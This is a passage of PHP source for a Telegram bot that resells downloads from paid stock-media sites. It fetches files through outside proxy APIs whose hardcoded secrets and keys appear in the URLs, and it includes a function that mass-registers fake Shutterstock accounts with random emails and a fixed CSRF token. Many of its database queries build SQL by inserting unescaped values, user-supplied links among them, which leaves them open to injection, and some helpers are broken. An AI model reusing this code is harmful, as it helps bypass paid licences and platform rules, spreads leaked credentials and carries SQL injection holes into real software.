    $rows = mysqli_num_rows($res);
    if($rows > 0) {
        while($row = mysqli_fetch_assoc($res)) {
            $dbid = $row['id'];
        }
    }
    $res = mysqli_query($db, "SELECT * FROM `sharedaccounts` WHERE `dbid` = '$dbid'");
    $rows = mysqli_num_rows($res);
    if($rows > 0) {
        while($row = mysqli_fetch_assoc($res)) {
            array_push($shid, $row['id']);
            $max = ($max + $row['max']);
        }
    }
    foreach($shid as $id) {
        $res = mysqli_query($db, "SELECT * FROM `sharedbuy` WHERE `dbid` = '$id'");
        $rows = mysqli_num_rows($res);
        if($rows > 0) {
            while($row = mysqli_fetch_assoc($res)) {
                if(!isSharedExpired($row['user'], $name)) {
                    $count ++;
                }
            }
        }
    }
    if($count < $max) {
        return true;
    }
    return false;
}
function toEnNumber($input) {
    $replace_pairs = array(
          '۰' => '0', '۱' => '1', '۲' => '2', '۳' => '3', '۴' => '4', '۵' => '5', '۶' => '6', '۷' => '7', '۸' => '8', '۹' => '9',
          '٠' => '0', '١' => '1', '٢' => '2', '٣' => '3', '٤' => '4', '٥' => '5', '٦' => '6', '٧' => '7', '٨' => '8', '٩' => '9'
    );
    return strtr($input, $replace_pairs);
}
function MONTHS($months) {
	return ($months * 2592000);
}
function DAYS($days) {
	return ($days * 86400);
}
function getNumbersEx($string) {
	$return = "";
	for($i = 0; $i < strlen($string); $i++) {
    	if(is_numeric($string[$i])) {
        	$return .= $string[$i];
        }
    }
    return $return;
}
function genRandomNumber($length = 15, $formatted = true) {
    $nums = '0123456789';
    $out = $nums[mt_rand(1, strlen($nums) - 1)];  
    for($p = 0; $p < $length-1; $p++)
        $out .= $nums[mt_rand( 0, strlen($nums) - 1)];
    if($formatted)
        return number_format($out);
    return $out;
}
function sendAdminMessage($text, $key = null) {
    global $db;
    $count = 0;
    $res = mysqli_query($db, "SELECT * FROM `users` WHERE `admin` != '-1' AND `dnd` = '0'");
    $rows = mysqli_num_rows($res);
    if($rows > 0) {
        while($row = mysqli_fetch_assoc($res)) {
            sendMessage($row['id'], $text, -1, $key);
            $count ++;
        }
    }
    return $count;
}
function forwardMessage($chat_id, $from_chat_id, $message_id) {
	return bot('forwardMessage',[
        'chat_id' => $chat_id,
        'from_chat_id' => $from_chat_id,
        'message_id' => $message_id
    ]);
}
function sendToDebug($chat_id, $message_id) {
    global $db;
    $res = mysqli_query($db, "SELECT * FROM `users` WHERE `admin` != '-1' AND `debug` != '0'");
    $rows = mysqli_num_rows($res);
    if($rows > 0) {
        while($row = mysqli_fetch_assoc($res)) {
            forwardMessage($row['id'], $chat_id, $message_id);
        }
    }
    return true;
}
function secondsToTime($seconds) {
    $secondsInAMinute = 60;
    $secondsInAnHour  = 60 * $secondsInAMinute;
    $secondsInADay    = 24 * $secondsInAnHour;
    $days = floor($seconds / $secondsInADay);
    $hourSeconds = $seconds % $secondsInADay;
    $hours = floor($hourSeconds / $secondsInAnHour);
    $minuteSeconds = $hourSeconds % $secondsInAnHour;
    $minutes = floor($minuteSeconds / $secondsInAMinute);
    $remainingSeconds = $minuteSeconds % $secondsInAMinute;
    $seconds = ceil($remainingSeconds);
    $result = array(
        'days' => (int) $days,
        'hours' => (int) $hours,
        'minutes' => (int) $minutes,
        'seconds' => (int) $seconds
    );
    return $result;
}
function getDoublePrice($num) {
    $multiply = 5;
    if($num < 2) {
        return $multiply;
    }
    return $num * $multiply;
}
function isSubExpired($user) {
    $sub = getUser($user, 'subscription');
    if($sub > time()) {
        return false;
    }
    return true;
}
function isFSubExpired($user) {
    $sub = getUser($user, 'fsubscription');
    if($sub > time()) {
        return false;
    }
    return true;
}
function isPremium($user) {
    $sub = getUser($user, 'premium');
    if($sub > time()) {
        return true;
    }
    return false;
}
function isHostExpired($id) {
    $expire = getHost($id, 'expire');
    if($expire > time()) {
        return false;
    }
    return true;
}
function isAPIExpired($user, $domain) {
    $sub = getAPI($user, $domain, 'time');
    $uses = getAPI($user, $domain, 'uses');
    $maxuses = getAPI($user, $domain, 'maxuses');
    if($sub > time() && $uses < $maxuses) {
        return false;
    }
    return true;
}
function isSharedExpired($user, $name) {
    global $db;
    $dbid = -1;
    $time = 0;
    $ids = array();
    $idsh = array();
    $res = mysqli_query($db, "SELECT * FROM `shared` WHERE `name` = '$name'");
    $rows = mysqli_num_rows($res);
    if($rows > 0) {
        while($row = mysqli_fetch_assoc($res)) {
            array_push($ids, $row['id']);
        }
    }
    foreach($ids as $dbid) {
        $res = mysqli_query($db, "SELECT * FROM `sharedaccounts` WHERE `dbid` = '$dbid'");
        $rows = mysqli_num_rows($res);
        if($rows > 0) {
            while($row = mysqli_fetch_assoc($res)) {
                array_push($idsh, $row['id']);
            }
        }
    }
    foreach($idsh as $dbid) {
        $res = mysqli_query($db, "SELECT * FROM `sharedbuy` WHERE `dbid` = '$dbid' AND `user` = '$user'");
        $rows = mysqli_num_rows($res);
        if($rows > 0) {
            while($row = mysqli_fetch_assoc($res)) {
                $time = $row['time'];
            }
            if(($time + SHARED_EXPIRE) > time()) {
                return false;
            }
        }
    }
    return true;
}
function paypalFee($inputAmount){
      $fee = ($inputAmount * 0.054) + 0.38;
      $totalcost = round($inputAmount + $fee , 2);
      return $totalcost;
}
function verifyPPTransaction($data) {
    $req = 'cmd=_notify-validate';
    foreach ($data as $key => $value) {
        $value = urlencode(stripslashes($value));
        $value = preg_replace('/(.*[^%^0^D])(%0A)(.*)/i', '${1}%0D%0A${3}', $value); // IPN fix
        $req .= "&$key=$value";
    }

    $ch = curl_init(PAYPAL_URL);
    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $req);
    curl_setopt($ch, CURLOPT_SSLVERSION, 6);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($ch, CURLOPT_FORBID_REUSE, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Connection: Close'));
    $res = curl_exec($ch);

    if (!$res) {
        $errno = curl_errno($ch);
        $errstr = curl_error($ch);
        curl_close($ch);
        throw new Exception("cURL error: [$errno] $errstr");
    }

    $info = curl_getinfo($ch);

    // Check the http response
    $httpCode = $info['http_code'];
    if ($httpCode != 200) {
        throw new Exception("PayPal responded with http code $httpCode");
    }
    curl_close($ch);

    return $res === 'VERIFIED';
}
function checkTxnid($txnid) {
    global $db;

    $txnid = $db->real_escape_string($txnid);
    $results = $db->query('SELECT * FROM `paypalpayments` WHERE txn_id = \'' . $txnid . '\'');

    return ! $results->num_rows;
}
function toSinglePostID($str) {
    $str = str_replace(' ', '', $str);
	$str = urldecode($str);
    $str = toEnNumber($str);
	if(isFind($str, 'p/')) {
    	$str = explode('p/', $str)[1];
    }
    elseif(isFind($str, 'tv/')) {
    	$str = explode('tv/', $str)[1];
    }
    elseif(isFind($str, 'reel/')) {
    	$str = explode('reel/', $str)[1];
    }
    $str = explode('?', $str)[0];
    $str = explode('/', $str)[0];
    return $str;
}
function isShutterFootageName($name) {
    return isFind(strtolower($name), 'shutterstock') && isFind(strtolower($name), 'footage');
}
function randomString($length = 16, $filter = false) {
    $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    if($filter) {
        $characters = 'abcdefghijklmnopqrstuvwxyz';
    }
    $charactersLength = strlen($characters);
    $randomString = '';
    for($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function createShutterstock($email = null, $password = null) {
    $randomEmail = randomString(10).'@gmail.com';
    $randomPassword = randomString(10);
    if($email != null) {
        $randomEmail = $email;
    }
    if($password != null) {
        $randomPassword = $password;
    }
    $url = 'https://accounts.shutterstock.com/users?';
    $ch = curl_init($url);
    $payload = json_encode(array("fakeusernameremembered" => "", "fakepasswordremembered" => "", "email_register" => $randomEmail, "pass_register" => $randomPassword, "special_offers" => "Y", "_csrf" => "81a439bf-48df-4264-ae64-d17c7a216542", "next" => "/", "photo_agree_to_tos" => "y", "tos_v" => "343538315f343538335f343538355f343538375f343538395f343539315f343539335f343539355f343539375f343539395f34363031"));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
    return array('email' => $randomEmail, 'username' => explode('@', $randomEmail)[0], 'password' => $randomPassword);
}
function removeBefore($string, $before) {
    $pos = strpos($string, $before);
    return $pos !== false ? substr($string, $pos + strlen($before), strlen($string)) : $in;
}
function removeAfter($string, $remove) {
    if(isFind($string, $remove)) {
        return substr($string, 0, (strpos($string, $remove) + strlen($remove)));
    }
    return $string;
}
function getDomain($string) {
    if(isFind($string, 'http://') || isFind($string, 'https://')) {
        return parse_url($string)['host'];
    }
    return parse_url('https://'.$string)['host'];
}
function getDomainName($string) {
    $info = parse_url($string);
    $host = $info['host'];
    $names = explode(".", $host);
    $name = $names[count($names) - 2];
    return $name;
}
function getStringNumbers($string) {
	$return = "";
	for($i = 0; $i < strlen($string); $i++) {
    	if(is_numeric($string[$i])) {
        	$return .= $string[$i];
        }
    }
    return $return;
}
function isValidFileDomain($domain) {
    $domains = array("123rf.com", "alamy.com", "audiojungle.net", "creativefabrica.com", "elements.envato.com", "epidemicsound.com", "freepik.com", "gettyimages.com", "gfxplugin.com", "iconscout.com", "istockphoto.com", "lovepik.com", "motionarray.com", "pikbest.com", "placeit.net", "pngtree.com", "shutterstock.com", "soundstripe.com", "stock.adobe.com", "stockunlimited.com", "storyblocks.com", "twenty20.com", "ui8.net", "videohive.net", "vecteezy.com", "themeforest.net", "codecanyon.net", "creativemarket.com", "vectorstock.com", "dreamstime.com", "yellowimages.com", "depositphotos.com");
    $domainsEx = $domains;
    for($i = 0; $i < sizeof($domains); $i++) {
        $domainsEx[$i] = 'www.'.$domains[$i];
    }
    if(in_array($domain, $domains) || in_array($domain, $domainsEx)) {
        return true;
    }
    return false;
}
function getFileID($link) {
    $str = urldecode($link);
    $domain = strtolower(getDomain($str));
    $domain = str_replace('www.', '', $domain);
    if(isStringNumber($domain)) {
        $str = str_replace($domain, '', $str);
    }
    if(isFind($str, '?') || isFind($str, '.htm')) {
        $haveNumbers = false;
        $numbers = getStringNumbers($str);
        if(!empty($numbers) || strlen($numbers) > 0) {
            $haveNumbers = true;
        }
        $str = removeAfter($str, '?');
        $str = removeAfter($str, '.htm');
        $str = str_replace('?', '', $str);
        $numbersEx = getStringNumbers($str);
        if($haveNumbers && (is_null($numbersEx) || empty($numbersEx) || strlen($numbersEx) < 1)) {
            return 0;
        }
    }
    $lid = 0;
    if($domain == 'elements.envato.com') {
        if(isFind($str, '-')) {
            $lid = explode('-', $str);
            $lid = $lid[(sizeof($lid) - 1)];
        }
    }
    elseif($domain == 'motionarray.com') {
        if(isFind($str, '-')) {
            $lid = removeAfter($str, '?');
            $lid = str_replace('?', '', $lid);
            $lid = explode('-', $lid);
            $lid = $lid[(sizeof($lid) - 1)];
            $lid = str_replace('/', '', $lid);
        }
    }
    elseif($domain == 'istockphoto.com') {
        if(isFind($str, '-gm')) {
            $lid = removeBefore($str, '-gm');
            $exp = explode("-", $lid);
            $lid = $exp[0];
        }
    }
    elseif($domain == 'shutterstock.com') {
        if(isFind($str, '-')) {
            if(isFind($str, '/video/') && isFind($str, 'clip-')) {
                $lid = removeBefore($str, 'clip-');
                $lid = removeAfter($lid, '-');
                $lid = str_replace('-', '', $lid);
            }
            elseif(isFind($str, '/music/') && isFind($str, 'track-')) {
                $lid = removeBefore($str, 'track-');
                $lid = removeAfter($lid, '-');
                $lid = str_replace('-', '', $lid);
            }
            else {
                $lid = explode('-', $str);
                $lid = $lid[(sizeof($lid) - 1)];
            }
        }
    }
    elseif($domain == 'creativefabrica.com') {
        if(isFind($str, '/product/')) {
            $lid = removeBefore($str, '/product/');
        }
    }
    elseif($domain == 'gfxplugin.com') {
        if(isFind($str, '/product/')) {
            $lid = removeBefore($str, '/product/');
        }
        else {
            $default = true;
        }
    }
    elseif($domain == 'ui8.net') {
        if(isFind($str, '/products/')) {
            $lid = removeBefore($str, '/products/');
        }
    }
    elseif($domain == 'freepik.com') {
        if(isFind($str, '.htm') && isFind($str, '_')) {
            $lid = removeBefore($str, '_');
            $lid = getStringNumbers($lid);
        }
    }
    elseif($domain == 'stock.adobe.com') {
        if(strpos($str, "?") !== false) {
    	    if(strpos($str, "&asset_id=") !== false) {
    			$explo = explode("&asset_id=", $str);
    			$lid = $explo[1];
    		}
    		elseif(strpos($str, "?asset_id=") !== false) {
    			$explo = explode("?asset_id=", $str);
    			$lid = end(explode("/", $explo[0]));
    		}
    		elseif(strpos($str, "?k=") !== false){
    			$explo = explode("?k=", $str);
    			$lid = $explo[1];
    		}
    		else {
    			$explo = explode("?", $str);
    			$explo = explode("/", $explo[0]);
    			$lid = end($explo);
    		}
        }
        else {
    		$explo = explode("/", $str);
    		$lid = end($explo);
        }
    }
    else {
        $lid = getStringNumbers($str);
    }
    return $lid;
}
function sendArchive($chat_id, $link) {
    global $db;
    $domain = strtolower(getDomain($link));
    $dquery = "SELECT * FROM `files` WHERE `link` = '$str'";
    $res = mysqli_query($db, $dquery);
    $lid = 0;
    if(mysqli_num_rows($res) < 1) {
        $lid = getFileID($link);
        $res = mysqli_query($db, "SELECT * FROM `files` WHERE `link` LIKE '%$domain%' AND `link` LIKE '%$lid%'");
    }
    $rows = mysqli_num_rows($res);
    $count = 0;
    $send = 0;
    if($rows > 0 && $rows < 21) {
        $sending = sendMessage($chat_id, "Trying to send <b>$rows</b> ".($rows == 1 ? "file" : "files")." related to ".'<a href="'.$link.'">'."this link</a> by your request in the website");
        while($row = mysqli_fetch_assoc($res)) {
            $count ++;
            $ftype = $row['ftype'];
            $fid = $row['fid'];
            $time = date('Y-m-d H:i:s', $row['time']);
            $cc = "[ <code>$count</code>/<code>$rows</code> ]\n\nArchived Date: [ <code>$time</code> ]";
            if($ftype == 'document') {
                $info = sendDocument($chat_id, $fid, $cc, $message_id);
            }
            elseif($ftype == 'photo') {
                $info = sendPhoto($chat_id, $fid, $cc, $message_id);
            }
            elseif($ftype == 'video') {
                $info = sendVideo($chat_id, $fid, $cc, $message_id);
            }
            elseif($ftype == 'audio') {
                $info = sendAudio($chat_id, $fid, $cc, $message_id);
            }
            if($info->ok) {
                $send ++;
            }
        }
        if($send > 0) {
            sendMessage($chat_id, "<b>$send</b> ".($send == 1 ? "file" : "files")." has sent", $sending->result->message_id);
        }
        else {
            sendMessage($chat_id, "Something went wrong", $sending->result->message_id);
        }
    }
    return array('count' => $count, 'sent' => $send);
}
function sendFile($user_id, $chat_id, $link, $message_id = -1, $key = null, $filter = true, $caption = true, $private = false) {
    global $db;
    $default = false;
    $str = urldecode($link);
    $domain = strtolower(getDomain($str));
    $dquery = "SELECT * FROM `files` WHERE `link` = '$str'";
    $res = mysqli_query($db, $dquery);
    $lid = 0;
    if(mysqli_num_rows($res) > 0) {
        $filter = false;
    }
    if(isValidFileDomain($domain) && $filter) {
        $domain = str_replace('www.', '', $domain);
        if(isStringNumber($domain)) {
            $str = str_replace($domain, '', $str);
        }
        if(isFind($str, '?') || isFind($str, '.htm')) {
            $haveNumbers = false;
            $numbers = getStringNumbers($str);
            if(!empty($numbers) || strlen($numbers) > 0) {
                $haveNumbers = true;
            }
            $str = removeAfter($str, '?');
            $str = removeAfter($str, '.htm');
            $str = str_replace('?', '', $str);
            $numbersEx = getStringNumbers($str);
            if($haveNumbers && (is_null($numbersEx) || empty($numbersEx) || strlen($numbersEx) < 1)) {
                return 0;
            }
        }
        $lid = getFileID($str);
    }
    if($lid != '0') {
        $res = mysqli_query($db, "SELECT * FROM `files` WHERE `link` LIKE '%$domain%' AND `link` LIKE '%$lid%'");
    }
    else $default = true;
    if($default) {
        $res = mysqli_query($db, $dquery);
    }
    $rows = mysqli_num_rows($res);
    if($chat_id == null) {
        return $rows;
    }
    $count = 0;
    if($rows > 0 && $rows < 21) {
        while($row = mysqli_fetch_assoc($res)) {
            $count ++;
            $ftype = $row['ftype'];
            $fid = $row['fid'];
            $time = date('Y-m-d H:i:s', $row['time']);
            $cc = "[ <code>$count</code>/<code>$rows</code> ]\n\nArchived Date: [ <code>$time</code> ]";
            if(!$caption) {
                $dbid = $row['id'];
                $dblink = $row['link'];
                $requester = mentionUser($row['requester']);
                $addby = mentionUser($row['addby']);
                $cc = "A file found with these informations:\n\n______________________________\nDatabaseID: <code>$dbid</code>\nLink: <code>$dblink</code>\nRequested By: $requester\nSent By: $addby\nArchived At: <code>$time</code>\n______________________________\n\nFor delete all files related to this link from archive, use /delarch_$dbid\nFor delete only this file from archive, use /delfile_$dbid";
            }
            if($ftype == 'document') {
                sendDocument($chat_id, $fid, $cc, $message_id, $key);
            }
            elseif($ftype == 'photo') {
                sendPhoto($chat_id, $fid, $cc, $message_id, $key);
            }
            elseif($ftype == 'video') {
                sendVideo($chat_id, $fid, $cc, $message_id, $key);
            }
            elseif($ftype == 'audio') {
                sendAudio($chat_id, $fid, $cc, $message_id, $key);
            }
        }
    }
    else {
        if(((isChatVIP($chat_id) || getChats($chat_id, 'api') > '0') || isUserExist($chat_id))) {
            /*if(isFind($link, 'shutterstock.com') && isFind($link, 'lovepik.com') && isFind($link, 'pikbest.com') && isFind($link, 'graphicpear.com') && isFind($link, '123rf.com')) {
                $api = 'https://dmosmm.com/Api/?User=n1stock&Pass=n1stock&Links=["'.$link.'"]&Method=Download';
                $dl = json_decode(json_decode(file_get_contents($api))->Success)[0];
                if(isLink($dl)) {
                  
                    $name = getFileNameFromURL($dl);
                    $size = formatBytes(getFileSize($dl));
                    sendMessage($chat_id, '🔻 <a href="'.$link.'">'.$name.'</a>'."\nTo download the file, use the button below", $message_id, retIKey13($dl, $size));
                    return 1;
                }
            }*/
            
            /*if(isFind($link, 'stock.adobe.com')) {
                $link = str_replace('?', '', removeAfter($link, '?'));
                $api = json_decode(file_get_contents("http://157.90.198.73/adobe.php?secret=tonyyasinsina&url=$link"));
                if($api->status == 'Success' && isLink($api->url)) {
                    $dl = $api->url;
                    $ext = getExtension($dl);
                    //$name = urldecode("AdobeStock_".$api->imageid.".$ext");
                    //$name = str_replace('"&', '', removeAfter($name, '"&'));
                    $name = $api->filename;
                    $site = $api->stocksite;
                    $id = $api->imageid;
                    
                    $extension = pathinfo($name, PATHINFO_EXTENSION);
                    $newfname = $site."_".$id.'.'.($extension == 'jpg' ? 'jpeg' : $extension);
                    
                    $size = formatBytes(getFileSize($dl));
                    sendMessage($chat_id, '🔻 <a href="'.$link.'">'.$newfname.'</a>'."\nTo download the file, use the button below", $message_id, retIKey13($dl, $size));
                    $file = downloadFile2($dl,$site,$id);
                    rename($file, "api/files/adobe/$newfname");
                    return 1;
                }
            }*/
            if(isFind($link, 'pngtree.com')) {
                $api = json_decode(file_get_contents("http://157.90.198.73/pngtree.php?url=$link"));
                if($api->status == 'Success' && isLink($api->url)) {
                    $dl = $api->url;
                    $name = $api->filename;
                    $id = $api->imageid;
                    $size = formatBytes(getFileSize($dl));
                    sendMessage($chat_id, '🔻 <a href="'.$link.'">'.$name.'</a>'."\nTo download the file, use the button below", $message_id, retIKey13($dl, $size));
                    $file = downloadFile($dl);
                    rename($file, "api/files/pngtree/$name");
                    return 1;
                }
            }
            if(isFind($link, 'depositphotos.com')) {
                $api = json_decode(file_get_contents("http://157.90.198.73/deposit.php?url=$link&act=download"));
                if($api->status == 'Success' && isLink($api->url)) {
                    $dl = $api->url;
                    $name = "Depositphotos_".$api->stockid;
                    $size = formatBytes(getFileSize($dl));
                    $file = downloadFile($dl);
                    $type = getContentType($file);
                    if(strtolower($type) == 'image/jpeg') $name .= '.jpg'; else $name .= '.eps';
                    sendMessage($chat_id, '🔻 <a href="'.$link.'">'.$name.'</a>'."\nTo download the file, use the button below", $message_id, retIKey13($dl, $size));
                    rename($file, "api/files/deposit/$name");
                    return 1;
                }
            }
            /*if(isFind($link, 'creativefabrica.com')) {
                $api = json_decode(file_get_contents("http://157.90.198.73/creativefabrica.php?url=$link&secret=tonyyasinsina"));
                if($api->status == 'Success' && isLink($api->url)) {
                    $dl = $api->url;
                    $name = $api->filename;
                    $size = formatBytes(getFileSize($dl));
                    sendMessage($chat_id, '🔻 <a href="'.$link.'">'.$name.'</a>'."\nTo download the file, use the button below", $message_id, retIKey13($dl, $size));
                    # $file = downloadFile($dl);
                    # rename($file, "api/files/creativefabrica/$name");
                    return 1;
                }
            }*/
            /*if(isFind($link, 'iconscout.com')) {
                $api = json_decode(file_get_contents("http://157.90.198.73/iconscout.php?url=$link&secret=tonyyasinsina"));
                if($api->status == 'Success' && isLink($api->url)) {
                    $dl = $api->url;
                    $name = $api->filename;
                    $size = formatBytes(getFileSize($dl));
                    sendMessage($chat_id, '🔻 <a href="'.$link.'">'.$name.'</a>'."\nTo download the file, use the button below", $message_id, retIKey13($dl, $size));
                    $file = downloadFile($dl);
                    rename($file, "api/files/iconscout/iconscout_$name");
                    return 1;
                }
            }*/
            /*if(isFind($link, 'freepik.com')) {
                $api = json_decode(file_get_contents("http://157.90.198.73/freepik.php?url=$link"));
                if($api->status && isLink($api->url)) {
                    $dl = $api->url;
                    $name = $api->filename;
                    $id = $api->id;
                    $extension = $api->extension;
                    $size = formatBytes(getFileSize($dl));
                    sendMessage($chat_id, '🔻 <a href="'.$link.'">'.$name.'</a>'."\nTo download the file, use the button below", $message_id, retIKey13($dl, $size));
                    return 1;
                }
            }*/
            if(isFind($link, 'pornhub.com')) {
                $orgurl = $link;
                $id = $link;
                $keys = [];
                if(isFind($id, 'viewkey=')) {
                    $id = removeBefore($id, 'viewkey=');
                }
                $data = file_get_contents("https://appsdev.cyou/xv-ph-rt/api/?site_id=pornhub&video_id=$id");
                $info = json_decode($data, true);
                if(isset($info['mp4'])) {
                    foreach($info['mp4'] as $quality=>$link) {
                        if(isLink($link)) {
                            # $size = formatBytes(getFileSize($link));
                            $keys[] = ['text' => "📥 $quality", 'url' => $link];
                        }
                    }
                }
                $key = json_encode(['inline_keyboard' => array_chunk($keys, 4)]);
                $photo = downloadFile($info['thumb']);
                $directory = explode('/', getcwd());
                $directory = $directory[sizeof($directory)-1];
                $ph = 'https://'.$_SERVER['HTTP_HOST'].'/'.$directory.'/'.$photo;
                sendPhoto($chat_id, $ph, '🔻 <a href="'.$orgurl.'">Video</a> has downloaded!', $message_id, $key);
                unlink($photo);
                return 1;
            }
            if(isFind($link, 'shutterstock.com') && !isFind($link, '/video/') && $private) {
                $data = json_decode(file_get_contents("http://tony.y4siiiin.com/shutter.php?secret=49c8ffc23cbe81693333cb97c6c0d215&act=download&id=$lid&type=shutterstock_photo"));
                if($data->status) {
                    $dl = $data->url;
                    $name = $data->filename;
                    $name = 'shutterstock_'.$data->id.'.'.getExtension($name);
                    $size = formatBytes(getFileSize($dl));
                    sendMessage($chat_id, '🔻 <a href="'.$link.'">'.$name.'</a>'.PHP_EOL.'To download the file, use the button below', $message_id, retIKey13($dl, $size));
                    $file = downloadFile($dl);
                    rename($file, "api/files/shutter/$name");
                    return 1;
                }
            }
            if(isFind($link, 'storyblocks.com')) {
                $data = file_get_contents("https://n1premium.com/storyblocksapi/index.php?key=3c09TYq0Js&url=$link");
                $info = json_decode($data);
                if($info->status) {
                    $download = $info->download;
                    $size = formatBytes(getFileSize($download));
                    $name = getFileNameFromURL($download);
                    sendMessage($chat_id, '🔻 <a href="'.$link.'">'.$name.'</a>'.PHP_EOL.'To download the file, use the button below', $message_id, retIKey13($download, $size));
                }
            }
            /*if(isFind($link, 'storyblocks.com')) {
                $directory = explode('/', getcwd());
                $directory = $directory[sizeof($directory)-1];
                $url = 'https://'.$_SERVER['HTTP_HOST'].'/'.$directory.'/api/index.php?url='.$link;
                $request = file_get_contents($url);
                $info = json_decode($request, true);
                if($info['status']) {
                    $id = $info['id'];
                    $types = $info['types'];
                    $thumbnail = $info['thumbnail'];
                    $title = $info['title'];
                    if(sizeof($types) > 1) {
                        $photo = downloadFile($thumbnail);
                        $photo_url = 'https://'.$_SERVER['HTTP_HOST'].'/'.$directory.'/'.$photo;
                        setUser($user_id, 'step', "stblck_$link");
                        sendPhoto($chat_id, $photo_url, '🔻 <a href="'.$link.'">'.$title.'</a>', $message_id, retIKey23($id, $types));
                        unlink($photo);
                    }
                    else {
                        $type = 0;
                        foreach($types as $ttype => $details) {
                            $type = $ttype;
                        }
                        sendStoryblocks($chat_id, $link, $id, $type, $message_id);
                    }
                }
            }*/
            #(isFind($link, 'stock.adobe.com') && $private)
            if((isFind($link, 'istockphoto') || isFind($link, 'gettyimages') || isFind($link, 'lovepik') || isFind($link, 'elements.envato.com') || isFind($link, 'freepik.com') || isFind($link, 'motionarray.com') || isFind($link, 'stock.adobe.com') || isFind($link, '123rf.com') || isFind($link, 'radiojavan.com') || isFind($link, 'rj.app') || isFind($link, 'rjplay.co') || isFind($link, 'rjvan.me') || isFind($link, 'vecteezy.com') || (isFind($link, 'shutterstock') && !isFind($link, '/video/') && !isFind($link, 'storyblocks.com') && $private))) {
                if(isFind($link, 'shutterstock') || isFind($link, 'lovepik') || isFind($link, 'elements.envato.com') || isFind($link, 'freepik.com') || isFind($link, 'motionarray.com') || isFind($link, 'stock.adobe.com') || isFind($link, '123rf.com') || isFind($link, 'radiojavan.com') || isFind($link, 'rj.app') || isFind($link, 'rjplay.co') || isFind($link, 'rjvan.me') || isFind($link, 'vecteezy.com')) {
                    $directory = explode('/', getcwd());
                    $directory = $directory[sizeof($directory)-1];
                    $url = 'https://'.$_SERVER['HTTP_HOST'].'/'.$directory.'/api/index.php?url='.$link;
                    $file = json_decode(file_get_contents($url), true);
                    if($file['status']) {
                        $name = $file['name'];
                        $size = formatBytes($file['size']);
                        $dl = $file['download'];
                        if(isFind($link, 'elements.envato.com')) {
                             $license = $file['license'];
                             sendMessage($chat_id, '🔻 <a href="'.$link.'">'.$name.'</a>'.PHP_EOL.'🔻 <a href="'.$license.'">Download license here</a>.'.PHP_EOL.'To download the file, use the button below', $message_id, retIKey13($dl, $size));
                        }
                        else {
                            sendMessage($chat_id, '🔻 <a href="'.$link.'">'.$name.'</a>'.PHP_EOL.'To download the file, use the button below', $message_id, retIKey13($dl, $size));
                        }
                        return 1;
                    }
                }
                else {
                    $start = microtime(true);
                    $directory = explode('/', getcwd());
                    $directory = $directory[sizeof($directory)-1];
                    $url = 'https://'.$_SERVER['HTTP_HOST'].'/'.$directory.'/api/index.php?url='.$link;
                    $end = microtime(true);
                    $time = round($end - $start);
                    $document = sendDocument($chat_id, $url, "<b>Process Time:</b> <code>$time</code> <b>".($time == 1 ? "second" : "seconds")."</b>\n<b>From our API</b>", $message_id);
                    if($document->ok && (isFind($link, 'lovepik'))) {
                        $file_id = $document->result->document->file_id;
                        if(isset($file_id) && !empty($file_id)) {
                            $bot_id = bot('getMe')->result->id;
                            createFile($link, 'document', $file_id, $from_id, $bot_id);
                        }
                        return 1;
                    }
                }
            }
        }
    }
    return $rows;
}
function isStringNumber($string) {
    if(preg_match('~[0-9]+~', $string)) {
        return true;
    }
    return false;
}
function addSub($user, $month, $days = false) {
    if(isUserExist($user)) {
        $seconds = MONTHS($month);
        if($days) {
            $seconds = DAYS($month);
        }
        $time = getUser($user, 'subscription');
        if(isSubExpired($user)) {
            setUser($user, 'subscription', (time() + $seconds));
        }
        else {
            setUser($user, 'subscription', ($time + $seconds));
        }
        return true;
    }
    return false;
}
function addFSub($user, $month, $days = false) {
    if(isUserExist($user)) {
        $seconds = MONTHS($month);
        if($days) {
            $seconds = DAYS($month);
        }
        $time = getUser($user, 'fsubscription');
        if(isFSubExpired($user)) {
            setUser($user, 'fsubscription', (time() + $seconds));
        }
        else {
            setUser($user, 'fsubscription', ($time + $seconds));
        }
        return true;
    }
    return false;
}
function addPremium($user, $month, $days = false) {
    if(isUserExist($user)) {
        $seconds = MONTHS($month);
        if($days) {
            $seconds = DAYS($month);
        }
        $time = getUser($user, 'premium');
        if(!isPremium($user)) {
            setUser($user, 'premium', (time() + $seconds));
        }
        else {
            setUser($user, 'premium', ($time + $seconds));
        }
        return true;
    }
    return false;
}
function addAPISub($user, $domain, $maxuses, $month, $days = false) {
    if(isUserExist($user)) {
        $seconds = MONTHS($month);
        if($days) {
            $seconds = DAYS($month);
        }
        if(isAPIExist($user, $domain)) {
            $uses = getAPI($user, $domain, 'uses');
            if($uses >= $maxuses) {
                setAPI($user, $domain, 'uses', '0');
            }
            setAPI($user, $domain, 'maxuses', $maxuses);
            setAPI($user, $domain, 'time', (time() + $seconds));
        }
        else {
            createAPI($user, $domain, $maxuses, (time() + $seconds));
        }
        return true;
    }
    return false;
}
function getExtension($string) {
    $extension = 'null';
    $ex = explode('.', $string);
    $extension = $ex[(sizeof($ex) - 1)];
    return $extension;
}
function getLineWithString($fileName, $str) {
    $lines = file($fileName);
    foreach($lines as $lineNumber => $line) {
        if(strpos($line, $str) !== false) {
            return $line;
        }
    }
    return -1;
}
function getBetweenString($string, $start, $end) {
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}
function downloadFile2($url,$site,$id) {
    $filename = basename(trim(strtok($url, '?')));
        $extension = pathinfo($filename, PATHINFO_EXTENSION);
        $newfname = $site."_".$id.'.'.$extension;
    if(file_exists($newfname)) {
        return $newfname;
    }
